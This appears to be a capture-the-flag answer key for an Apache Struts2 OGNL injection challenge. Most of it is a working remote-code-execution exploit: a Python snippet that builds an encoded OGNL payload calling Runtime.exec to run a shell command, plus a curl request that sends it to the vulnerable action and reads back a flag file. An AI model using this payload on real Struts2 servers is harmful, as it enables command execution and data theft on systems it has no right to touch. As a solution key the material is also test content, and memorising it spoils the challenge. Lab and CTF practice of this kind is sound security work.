# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Apache Struts2 OGNL injection (the `message` parameter of
`/sendMessageAction.action` is evaluated as an OGNL expression), giving RCE. Use
it to run `cat /tmp/flag` and read the output back from the rendered message.

1. **Build the URL-encoded OGNL payload** that runs `/bin/sh -c "cat /tmp/flag"`,
   waits for it, and reads its stdout via the bundled Apache Commons IOUtils:

   ```bash
   python3 -c "
   import urllib.parse
   segs = [
    '#a=@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{\"/bin/sh\",\"-c\",\"cat /tmp/flag 2>&1\"})',
    '#a.waitFor()',
    '@org.apache.commons.io.IOUtils@toString(#a.getInputStream())'
   ]
   print(urllib.parse.quote(''.join('%{'+s+'}' for s in segs)))
   " > payload.txt
   ```

2. **Send it as the `message` parameter:**

   ```bash
   P=$(cat payload.txt)
   curl -s "http://<target>/sendMessageAction.action" --data "message=$P"
   ```

3. **Extract the flag** (`FLAG{...}`) from the rendered "Your message:" output
   (it follows some `Process[...]` noise) and report it verbatim.
